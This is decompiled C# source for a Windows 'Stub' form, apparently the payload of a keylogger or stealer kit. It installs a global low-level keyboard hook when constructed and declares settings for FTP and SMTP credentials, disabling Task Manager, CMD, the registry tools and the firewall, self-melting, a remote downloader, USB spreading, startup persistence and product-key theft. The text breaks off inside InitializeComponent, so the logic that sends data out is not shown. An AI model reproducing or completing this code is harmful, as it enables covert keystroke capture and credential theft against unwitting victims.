using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using Stub.MSKeyFinder;
using Stub.My;
using Stub.My.Resources;

namespace Stub;

[DesignerGenerated]
public class Form1 : Form
{
	public class KeyboardHook
	{
		private struct KBDLLHOOKSTRUCT
		{
			public int vkCode;

			public int scancode;

			public int flags;

			public int time;

			public int dwExtraInfo;
		}

		private delegate int KeyboardProcDelegate(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam);

		public delegate void KeyDownEventHandler(Keys Key);

		public delegate void KeyUpEventHandler(Keys Key);

		private static List<WeakReference> __ENCList = new List<WeakReference>();

		private const int HC_ACTION = 0;

		private const int WH_KEYBOARD_LL = 13;

		private const int WM_KEYDOWN = 256;

		private const int WM_KEYUP = 257;

		private const int WM_SYSKEYDOWN = 260;

		private const int WM_SYSKEYUP = 261;

		private static KeyDownEventHandler KeyDownEvent;

		private static KeyUpEventHandler KeyUpEvent;

		private static int KeyHook;

		private static KeyboardProcDelegate KeyHookDelegate;

		public static event KeyDownEventHandler KeyDown
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				KeyDownEvent = (KeyDownEventHandler)Delegate.Combine(KeyDownEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				KeyDownEvent = (KeyDownEventHandler)Delegate.Remove(KeyDownEvent, value);
			}
		}

		public static event KeyUpEventHandler KeyUp
		{
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			add
			{
				KeyUpEvent = (KeyUpEventHandler)Delegate.Combine(KeyUpEvent, value);
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			[DebuggerNonUserCode]
			remove
			{
				KeyUpEvent = (KeyUpEventHandler)Delegate.Remove(KeyUpEvent, value);
			}
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SetWindowsHookExA(int idHook, KeyboardProcDelegate lpfn, int hmod, int dwThreadId);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CallNextHookEx(int hHook, int nCode, int wParam, KBDLLHOOKSTRUCT lParam);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int hHook);

		public KeyboardHook()
		{
			lock (__ENCList)
			{
				__ENCList.Add(new WeakReference(this));
			}
			KeyHookDelegate = KeyboardProc;
			KeyHook = SetWindowsHookExA(13, KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
		}

		private static int KeyboardProc(int nCode, int wParam, ref KBDLLHOOKSTRUCT lParam)
		{
			if (nCode == 0)
			{
				switch (wParam)
				{
				case 256:
				case 260:
					KeyDownEvent?.Invoke((Keys)lParam.vkCode);
					break;
				case 257:
				case 261:
					KeyUpEvent?.Invoke((Keys)lParam.vkCode);
					break;
				}
			}
			return CallNextHookEx(KeyHook, nCode, wParam, lParam);
		}

		protected override void Finalize()
		{
			UnhookWindowsHookEx(KeyHook);
			base.Finalize();
		}
	}

	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("lblFirewall")]
	private Label _lblFirewall;

	[AccessedThroughProperty("lblUsername")]
	private Label _lblUsername;

	[AccessedThroughProperty("lblPassword")]
	private Label _lblPassword;

	[AccessedThroughProperty("lblInterval")]
	private Label _lblInterval;

	[AccessedThroughProperty("lblTaskManager")]
	private Label _lblTaskManager;

	[AccessedThroughProperty("lblCMD")]
	private Label _lblCMD;

	[AccessedThroughProperty("lblRegistryTools")]
	private Label _lblRegistryTools;

	[AccessedThroughProperty("lblFileName")]
	private Label _lblFileName;

	[AccessedThroughProperty("lblStartUp")]
	private Label _lblStartUp;

	[AccessedThroughProperty("lblInfo")]
	private Label _lblInfo;

	[AccessedThroughProperty("lblFake")]
	private Label _lblFake;

	[AccessedThroughProperty("txtContent")]
	private Label _txtContent;

	[AccessedThroughProperty("txtTitle")]
	private Label _txtTitle;

	[AccessedThroughProperty("lblHost")]
	private Label _lblHost;

	[AccessedThroughProperty("lblFTPUsername")]
	private Label _lblFTPUsername;

	[AccessedThroughProperty("lblFTPPassword")]
	private Label _lblFTPPassword;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	[AccessedThroughProperty("Crap")]
	private Label _Crap;

	[AccessedThroughProperty("lblMelt")]
	private Label _lblMelt;

	[AccessedThroughProperty("txtWin")]
	private TextBox _txtWin;

	[AccessedThroughProperty("lblPort")]
	private Label _lblPort;

	[AccessedThroughProperty("lblSMTP")]
	private Label _lblSMTP;

	[AccessedThroughProperty("lblWin")]
	private Label _lblWin;

	[AccessedThroughProperty("Timer4")]
	private Timer _Timer4;

	[AccessedThroughProperty("lblFTPBack")]
	private Label _lblFTPBack;

	[AccessedThroughProperty("lblSysRes")]
	private Label _lblSysRes;

	[AccessedThroughProperty("lblShow")]
	private Label _lblShow;

	[AccessedThroughProperty("lblDownloader")]
	private Label _lblDownloader;

	[AccessedThroughProperty("lblDownloadURL")]
	private Label _lblDownloadURL;

	[AccessedThroughProperty("lblDownloadFN")]
	private Label _lblDownloadFN;

	[AccessedThroughProperty("lblDownloadSP")]
	private Label _lblDownloadSP;

	[AccessedThroughProperty("lblWB")]
	private Label _lblWB;

	[AccessedThroughProperty("lblAnti")]
	private Label _lblAnti;

	[AccessedThroughProperty("lblCusWes")]
	private Label _lblCusWes;

	[AccessedThroughProperty("lblUSB")]
	private Label _lblUSB;

	[AccessedThroughProperty("Timer5")]
	private Timer _Timer5;

	[AccessedThroughProperty("TextBox3")]
	private TextBox _TextBox3;

	[AccessedThroughProperty("lblSaved")]
	private Label _lblSaved;

	[AccessedThroughProperty("TextBox4")]
	private TextBox _TextBox4;

	[AccessedThroughProperty("Timer6")]
	private Timer _Timer6;

	[AccessedThroughProperty("lblApp")]
	private Label _lblApp;

	[AccessedThroughProperty("Timer7")]
	private Timer _Timer7;

	[AccessedThroughProperty("Timer8")]
	private Timer _Timer8;

	[AccessedThroughProperty("Timer9")]
	private Timer _Timer9;

	[AccessedThroughProperty("lblExt")]
	private Label _lblExt;

	private string[] options;

	private string HisUsrnme;

	private string HisPsswrd;

	private string Hisintval;

	private string DisableHisTaskMgr;

	private string DisableHisCMD;

	private string DisableHisRegistry;

	private string HisStartUp;

	private string HisName;

	private string HisInfo;

	private string DisFirewall;

	private string DisSysRes;

	private string DisShow;

	private string HisFake;

	private string HisTitle;

	private string HisMessage;

	private string FTPHost;

	private string FTPUsername;

	private string FTPPassword;

	private string FTPBack;

	private string Melt;

	private string EPort;

	private string ESMTP;

	private string Win;

	private string Downloader;

	private string DownloadURL;

	private string DownloadFilename;

	private string DownloadSP;

	private string WB;

	private string Anti;

	private string CustomWebsite;

	private string stats;

	private string stats2;

	private WebClient webclient;

	private WebClient webclient2;

	private string USB;

	private string Saved;

	private string App;

	private string Exti;

	private int Result;

	private string WindowsPath;

	private const string FileSplit = "@541@";

	[AccessedThroughProperty("kbHook")]
	private KeyboardHook _kbHook;

	private string strin;

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label lblFirewall
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblFirewall;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblFirewall = value;
		}
	}

	internal virtual Label lblUsername
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblUsername;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblUsername = value;
		}
	}

	internal virtual Label lblPassword
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblPassword;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblPassword = value;
		}
	}

	internal virtual Label lblInterval
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblInterval;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblInterval = value;
		}
	}

	internal virtual Label lblTaskManager
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblTaskManager;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblTaskManager = value;
		}
	}

	internal virtual Label lblCMD
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblCMD;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblCMD = value;
		}
	}

	internal virtual Label lblRegistryTools
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblRegistryTools;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblRegistryTools = value;
		}
	}

	internal virtual Label lblFileName
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblFileName;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblFileName = value;
		}
	}

	internal virtual Label lblStartUp
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblStartUp;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblStartUp = value;
		}
	}

	internal virtual Label lblInfo
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblInfo;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblInfo = value;
		}
	}

	internal virtual Label lblFake
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblFake;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblFake = value;
		}
	}

	internal virtual Label txtContent
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtContent;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txtContent = value;
		}
	}

	internal virtual Label txtTitle
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtTitle;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txtTitle = value;
		}
	}

	internal virtual Label lblHost
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblHost;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblHost = value;
		}
	}

	internal virtual Label lblFTPUsername
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblFTPUsername;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblFTPUsername = value;
		}
	}

	internal virtual Label lblFTPPassword
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblFTPPassword;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblFTPPassword = value;
		}
	}

	internal virtual Timer Timer3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label Crap
	{
		[DebuggerNonUserCode]
		get
		{
			return _Crap;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Crap = value;
		}
	}

	internal virtual Label lblMelt
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblMelt;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblMelt = value;
		}
	}

	internal virtual TextBox txtWin
	{
		[DebuggerNonUserCode]
		get
		{
			return _txtWin;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_txtWin = value;
		}
	}

	internal virtual Label lblPort
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblPort;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblPort = value;
		}
	}

	internal virtual Label lblSMTP
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblSMTP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblSMTP = value;
		}
	}

	internal virtual Label lblWin
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblWin;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblWin = value;
		}
	}

	internal virtual Timer Timer4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer4_Tick;
			if (_Timer4 != null)
			{
				_Timer4.remove_Tick(eventHandler);
			}
			_Timer4 = value;
			if (_Timer4 != null)
			{
				_Timer4.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label lblFTPBack
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblFTPBack;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblFTPBack = value;
		}
	}

	internal virtual Label lblSysRes
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblSysRes;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblSysRes = value;
		}
	}

	internal virtual Label lblShow
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblShow;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblShow = value;
		}
	}

	internal virtual Label lblDownloader
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblDownloader;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblDownloader = value;
		}
	}

	internal virtual Label lblDownloadURL
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblDownloadURL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblDownloadURL = value;
		}
	}

	internal virtual Label lblDownloadFN
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblDownloadFN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblDownloadFN = value;
		}
	}

	internal virtual Label lblDownloadSP
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblDownloadSP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblDownloadSP = value;
		}
	}

	internal virtual Label lblWB
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblWB;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblWB = value;
		}
	}

	internal virtual Label lblAnti
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblAnti;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblAnti = value;
		}
	}

	internal virtual Label lblCusWes
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblCusWes;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblCusWes = value;
		}
	}

	internal virtual Label lblUSB
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblUSB;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblUSB = value;
		}
	}

	internal virtual Timer Timer5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer5_Tick;
			if (_Timer5 != null)
			{
				_Timer5.remove_Tick(eventHandler);
			}
			_Timer5 = value;
			if (_Timer5 != null)
			{
				_Timer5.add_Tick(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox3 = value;
		}
	}

	internal virtual Label lblSaved
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblSaved;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblSaved = value;
		}
	}

	internal virtual TextBox TextBox4
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox4 = value;
		}
	}

	internal virtual Timer Timer6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer6_Tick;
			if (_Timer6 != null)
			{
				_Timer6.remove_Tick(eventHandler);
			}
			_Timer6 = value;
			if (_Timer6 != null)
			{
				_Timer6.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label lblApp
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblApp;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblApp = value;
		}
	}

	internal virtual Timer Timer7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer7_Tick;
			if (_Timer7 != null)
			{
				_Timer7.remove_Tick(eventHandler);
			}
			_Timer7 = value;
			if (_Timer7 != null)
			{
				_Timer7.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer8
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer8_Tick;
			if (_Timer8 != null)
			{
				_Timer8.remove_Tick(eventHandler);
			}
			_Timer8 = value;
			if (_Timer8 != null)
			{
				_Timer8.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer9
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer9;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer9_Tick;
			if (_Timer9 != null)
			{
				_Timer9.remove_Tick(eventHandler);
			}
			_Timer9 = value;
			if (_Timer9 != null)
			{
				_Timer9.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Label lblExt
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblExt;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblExt = value;
		}
	}

	private virtual KeyboardHook kbHook
	{
		[DebuggerNonUserCode]
		get
		{
			return _kbHook;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			KeyboardHook.KeyDownEventHandler value2 = shiftandcaps;
			if (_kbHook != null)
			{
				KeyboardHook.KeyDown -= value2;
			}
			_kbHook = value;
			if (_kbHook != null)
			{
				KeyboardHook.KeyDown += value2;
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		lock (__ENCList)
		{
			__ENCList.Add(new WeakReference(this));
		}
		webclient = new WebClient();
		webclient2 = new WebClient();
		WindowsPath = Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "PathName", (object)null));
		kbHook = new KeyboardHook();
		strin = null;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_006a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0074: Expected O, but got Unknown
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Expected O, but got Unknown
		//IL_0080: Unknown result type (might be due to invalid IL or missing references)
		//IL_008a: Expected O, but got Unknown
		//IL_008b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0095: Expected O, but got Unknown
		//IL_0096: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ab: Expected O, but got Unknown
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b6: Expected O, but got Unknown
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c1: Expected O, but got Unknown
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cc: Expected O, but got Unknown
		//IL_00cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d7: Expected O, but got Unknown
		//IL_00d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Expected O, but got Unknown
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Expected O, but got Unknown
		//IL_00ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f8: Expected O, but got Unknown
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0109: Expected O, but got Unknown
		//IL_010a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0114: Expected O, but got Unknown
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_011f: Expected O, but got Unknown
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_012a: Expected O, but got Unknown
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0135: Expected O, but got Unknown
		//IL_0136: Unknown result type (might be due to invalid IL or missing references)
		//IL_0140: Expected O, but got Unknown
		//IL_0141: Unknown result type (might be due to invalid IL or missing references)
		//IL_014b: Expected O, but got Unknown
		//IL_0152: Unknown result type (might be due to invalid IL or missing references)
		//IL_015c: Expected O, but got Unknown
		//IL_015d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0167: Expected O, but got Unknown
		//IL_0168: Unknown result type (might be due to invalid IL or missing references)
		//IL_0172: Expected O, but got Unknown
		//IL_0173: Unknown result type (might be due to invalid IL or missing references)
		//IL_017d: Expected O, but got Unknown
		//IL_017e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0188: Expected O, but got Unknown
		//IL_0189: Unknown result type (might be due to invalid IL or missing references)
		//IL_0193: Expected O, but got Unknown
		//IL_0194: Unknown result type (might be due to invalid IL or missing references)
		//IL_019e: Expected O, but got Unknown
		//IL_019f: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a9: Expected O, but got Unknown
		//IL_01aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b4: Expected O, but got Unknown
		//IL_01b5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bf: Expected O, but got Unknown
		//IL_01c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ca: Expected O, but got Unknown
		//IL_01cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d5: Expected O, but got Unknown
		//IL_01dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e6: Expected O, but got Unknown
		//IL_01e7: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f1: Expected O, but got Unknown
		//IL_01f2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fc: Expected O, but got Unknown
		//IL_01fd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0207: Expected O, but got Unknown
		//IL_020e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0218: Expected O, but got Unknown
		//IL_0219: Unknown result type (might be due to invalid IL or missing references)
		//IL_0223: Expected O, but got Unknown
		//IL_022a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0234: Expected O, but got Unknown
		//IL_023b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0245: Expected O, but got Unknown
		//IL_024c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0256: Expected O, but got Unknown
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_0261: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		TextBox1 = new TextBox();
		Timer2 = new Timer(components);
		Timer1 = new Timer(components);
		lblFirewall = new Label();
		lblUsername = new Label();
		lblPassword = new Label();
		lblInterval = new Label();
		lblTaskManager = new Label();
		lblCMD = new Label();
		lblRegistryTools = new Label();
		lblFileName = new Label();
		lblStartUp = new Label();
		lblInfo = new Label();
		lblFake = new Label();
		txtContent = new Label();
		txtTitle = new Label();
		lblHost = new Label();
		lblFTPUsername = new Label();
		lblFTPPassword = new Label();
		Timer3 = new Timer(components);
		Crap = new Label();
		lblMelt = new Label();
		txtWin = new TextBox();
		lblPort = new Label();
		lblSMTP = new Label();
		lblWin = new Label();
		Timer4 = new Timer(components);
		lblFTPBack = new Label();
		lblSysRes = new Label();
		lblShow = new Label();
		lblDownloader = new Label();
		lblDownloadURL = new Label();
		lblDownloadFN = new Label();
		lblDownloadSP = new Label();
		lblWB = new Label();
		lblAnti = new Label();
		lblCusWes = new Label();
		lblUSB = new Label();
		Timer5 = new Timer(components);
		TextBox3 = new TextBox();
		lblSaved = new Label();
		TextBox4 = new TextBox();
		Timer6 = new Timer(components);
		lblApp = new Label();
		Timer7 = new Timer(components);
		Timer8 = new Timer(components);
		Timer9 = new Timer(components);
		lblExt = new Label();
		((Control)this).SuspendLayout();
		componentResourceManager.ApplyResources(TextBox1, "TextBox1");
		((Control)TextBox1).set_Name("TextBox1");
		Timer2.set_Interval(60000);
		Timer1.set_Enabled(true);
		componentResourceManager.ApplyResources(lblFirewall, "lblFirewall");
		((Control)lblFirewall).set_Name("lblFirewall");
		componentResourceManager.ApplyResources(lblUsername, "lblUsername");
		((Control)lblUsername).set_Name("lblUsername");
		componentResourceManager.ApplyResources(lblPassword, "lblPassword");
		((Control)lblPassword).set_Name("lblPassword");
		componentResourceManager.ApplyResources(lblInterval, "lblInterval");
		((Control)lblInterval).set_Name("lblInterval");
		componentResourceManager.ApplyResources(lblTaskManager, "lblTaskManager");
		((Control)lblTaskManager).set_Name("lblTaskManager");
		componentResourceManager.ApplyResources(lblCMD, "lblCMD");
		((Control)lblCMD).set_Name("lblCMD");
		componentResourceManager.ApplyResources(lblRegistryTools, "lblRegistryTools");
		((Control)lblRegistryTools).set_Name("lblRegistryTools");
		componentResourceManager.ApplyResources(lblFileName, "lblFileName");
		((Control)lblFileName).set_Name("lblFileName");
		componentResourceManager.ApplyResources(lblStartUp, "lblStartUp");
		((Control)lblStartUp).set_Name("lblStartUp");
		componentResourceManager.ApplyResources(lblInfo, "lblInfo");
		((Control)lblInfo).set_Name("lblInfo");
		componentResourceManager.ApplyResources(lblFake, "lblFake");
		((Control)lblFake).set_Name("lblFake");
		componentResourceManager.ApplyResources(txtContent, "txtContent");
		((Control)txtContent).set_Name("txtContent");
		componentResourceManager.ApplyResources(txtTitle, "txtTitle");
		((Control)txtTitle).set_Name("txtTitle");
		componentResourceManager.ApplyResources(lblHost, "lblHost");
		((Control)lblHost).set_Name("lblHost");
		componentResourceManager.ApplyResources(lblFTPUsername, "lblFTPUsername");
		((Control)lblFTPUsername).set_Name("lblFTPUsername");
